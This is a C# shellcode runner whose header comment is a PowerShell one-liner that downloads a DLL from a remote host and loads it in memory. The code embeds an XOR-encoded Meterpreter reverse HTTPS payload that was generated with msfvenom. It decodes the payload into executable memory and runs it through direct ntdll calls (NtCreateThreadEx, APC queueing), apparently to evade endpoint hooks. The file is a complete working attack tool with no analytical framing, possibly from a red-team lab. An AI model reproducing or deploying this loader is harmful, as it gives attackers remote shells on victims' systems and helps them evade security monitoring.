// Reflective loading with:
// $data = (New-Object System.Net.WebClient).DownloadData('http://10.100.102.30/run.dll')
// $assem = [System.Reflection.Assembly]::Load($data)
// $class = $assem.GetType("ShellcodeRunner.Program")
// $method = $class.GetMethod("Run")
// $method.Invoke(0, $null)
//
using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    public class Program
    {
        // NTDLL imports
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            uint ZeroBits,
            ref uint RegionSize,
            uint AllocationType,
            uint Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint stackCommitSize,
            uint stackReserveSize,
            IntPtr attributeList
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtDelayExecution(bool Alertable, ref long DelayInterval);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr data, IntPtr offset, IntPtr size);

        // We directly use -1 to represent the current process and thread
        const int CurrentProcess = -1;
        const int CurrentThread = -1;

        public static void Run()
        {
            IntPtr addr = IntPtr.Zero;
            uint size = 0x1000; // 4 KB allocation

            // Attempt to allocate memory and check the status
            uint status = NtAllocateVirtualMemory(new IntPtr(CurrentProcess), ref addr, 0, ref size, 0x1000, 0x40); // MEM_COMMIT | PAGE_EXECUTE_READWRITE
            if (status != 0)
            {
                Console.WriteLine($"Memory allocation failed. Status: {status}");
                return;
            }
            Console.WriteLine($"Memory allocated at: {addr}");

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key a
            byte[] buf = new byte[460] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x3A, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x71, 0xA8, 0xE2, 0xB2, 0x71, 0xA8, 0xDA, 0xB2, 0x71, 0x88, 0xAA, 0xB2, 0xF5, 0x4D, 0xB0, 0xB0, 0xB7, 0xCB, 0x33, 0xB2, 0xCB, 0x3A, 0x56, 0xC6, 0x9B, 0x86, 0xF8, 0xD6, 0xDA, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0x18, 0x17, 0xA8, 0xBB, 0xAB, 0xB2, 0x71, 0xA8, 0xDA, 0x71, 0xB8, 0xC6, 0xB2, 0xFB, 0x2A, 0x71, 0x7A, 0x72, 0xFA, 0xFA, 0xFA, 0xB2, 0x7F, 0x3A, 0x8E, 0x9D, 0xB2, 0xFB, 0x2A, 0xAA, 0x71, 0xB2, 0xE2, 0xBE, 0x71, 0xBA, 0xDA, 0xB3, 0xFB, 0x2A, 0x19, 0xAC, 0xB2, 0x05, 0x33, 0xBB, 0x71, 0xCE, 0x72, 0xB2, 0xFB, 0x2C, 0xB7, 0xCB, 0x33, 0xB2, 0xCB, 0x3A, 0x56, 0xBB, 0x3B, 0x33, 0xF7, 0xBB, 0xFB, 0x3B, 0xC2, 0x1A, 0x8F, 0x0B, 0xB6, 0xF9, 0xB6, 0xDE, 0xF2, 0xBF, 0xC3, 0x2B, 0x8F, 0x22, 0xA2, 0xBE, 0x71, 0xBA, 0xDE, 0xB3, 0xFB, 0x2A, 0x9C, 0xBB, 0x71, 0xF6, 0xB2, 0xBE, 0x71, 0xBA, 0xE6, 0xB3, 0xFB, 0x2A, 0xBB, 0x71, 0xFE, 0x72, 0xB2, 0xFB, 0x2A, 0xBB, 0xA2, 0xBB, 0xA2, 0xA4, 0xA3, 0xA0, 0xBB, 0xA2, 0xBB, 0xA3, 0xBB, 0xA0, 0xB2, 0x79, 0x16, 0xDA, 0xBB, 0xA8, 0x05, 0x1A, 0xA2, 0xBB, 0xA3, 0xA0, 0xB2, 0x71, 0xE8, 0x13, 0xAD, 0x05, 0x05, 0x05, 0xA7, 0xB3, 0x44, 0x8D, 0x89, 0xC8, 0xA5, 0xC9, 0xC8, 0xFA, 0xFA, 0xBB, 0xAC, 0xB3, 0x73, 0x1C, 0xB2, 0x7B, 0x16, 0x5A, 0xFB, 0xFA, 0xFA, 0xB3, 0x73, 0x1F, 0xB3, 0x46, 0xF8, 0xFA, 0xFB, 0x41, 0xF0, 0x9E, 0x9C, 0xE4, 0xBB, 0xAE, 0xB3, 0x73, 0x1E, 0xB6, 0x73, 0x0B, 0xBB, 0x40, 0xB6, 0x8D, 0xDC, 0xFD, 0x05, 0x2F, 0xB6, 0x73, 0x10, 0x92, 0xFB, 0xFB, 0xFA, 0xFA, 0xA3, 0xBB, 0x40, 0xD3, 0x7A, 0x91, 0xFA, 0x05, 0x2F, 0xAA, 0xAA, 0xB7, 0xCB, 0x33, 0xB7, 0xCB, 0x3A, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x38, 0xB2, 0x05, 0x3A, 0xB2, 0x73, 0x3B, 0xBB, 0x40, 0x10, 0xF5, 0x25, 0x1A, 0x05, 0x2F, 0xB2, 0x73, 0x3D, 0x90, 0xEA, 0xBB, 0xA2, 0xB6, 0x73, 0x18, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0x63, 0x5F, 0x8E, 0x9B, 0x05, 0x2F, 0xB2, 0x7B, 0x3E, 0xBA, 0xF8, 0xFA, 0xFA, 0xB3, 0x42, 0x99, 0x97, 0x9E, 0xFA, 0xFA, 0xFA, 0xFA, 0xFA, 0xBB, 0xAA, 0xBB, 0xAA, 0xB2, 0x73, 0x18, 0xAD, 0xAD, 0xAD, 0xB7, 0xCB, 0x3A, 0x90, 0xF7, 0xA3, 0xBB, 0xAA, 0x18, 0x06, 0x9C, 0x3D, 0xBE, 0xDE, 0xAE, 0xFB, 0xFB, 0xB2, 0x77, 0xBE, 0xDE, 0xE2, 0x3C, 0xFA, 0x92, 0xB2, 0x73, 0x1C, 0xAC, 0xAA, 0xBB, 0xAA, 0xBB, 0xAA, 0xBB, 0xAA, 0xB3, 0x05, 0x3A, 0xBB, 0xAA, 0xB3, 0x05, 0x32, 0xB7, 0x73, 0x3B, 0xB6, 0x73, 0x3B, 0xBB, 0x40, 0x83, 0x36, 0xC5, 0x7C, 0x05, 0x2F, 0xB2, 0xCB, 0x28, 0xB2, 0x05, 0x30, 0x71, 0xF4, 0xBB, 0x40, 0xF2, 0x7D, 0xE7, 0x9A, 0x05, 0x2F, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x40, 0x5C, 0x6F, 0x47, 0x67, 0x05, 0x2F, 0xB2, 0x79, 0x3E, 0xD2, 0xC6, 0xFC, 0x86, 0xF0, 0x7A, 0x01, 0x1A, 0x8F, 0xFF, 0x41, 0xBD, 0xE9, 0x88, 0x95, 0x90, 0xFA, 0xA3, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            // XOR-decrypt the shellcode (make sure the key and encryption are correct)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ 0xfa);
            }

            // Allocate memory for the shellcode using NtAllocateVirtualMemory
            uint regionSize = (uint)buf.Length;
            status = NtAllocateVirtualMemory(new IntPtr(CurrentProcess), ref addr, 0, ref regionSize, 0x1000, 0x40); // MEM_COMMIT | PAGE_EXECUTE_READWRITE
            if (status != 0)
            {
                Console.WriteLine($"Shellcode memory allocation failed. Status: {status}");
                return;
            }

            Marshal.Copy(buf, 0, addr, buf.Length);
            Console.WriteLine($"Shellcode copied to memory at: {addr}");

            // Create a new thread using NtCreateThreadEx
            IntPtr hThread;
            status = NtCreateThreadEx(
                out hThread,
                0x1FFFFF,
                IntPtr.Zero,
                new IntPtr(CurrentProcess),
                addr,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            );
            if (status != 0)
            {
                Console.WriteLine($"Thread creation failed. Status: {status}");
                return;
            }

            Console.WriteLine($"Thread created with handle: {hThread}");

            // Queue an APC to the thread to execute the shellcode
            status = NtQueueApcThread(hThread, addr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
            {
                Console.WriteLine($"Failed to queue APC. Status: {status}");
                return;
            }

            // Sleep to allow the thread to process the APC (alternative to WaitForSingleObject)
            long delayInterval = 10000000; // Set delay for execution in 100ns units
            NtDelayExecution(false, ref delayInterval);
        }
    }
}
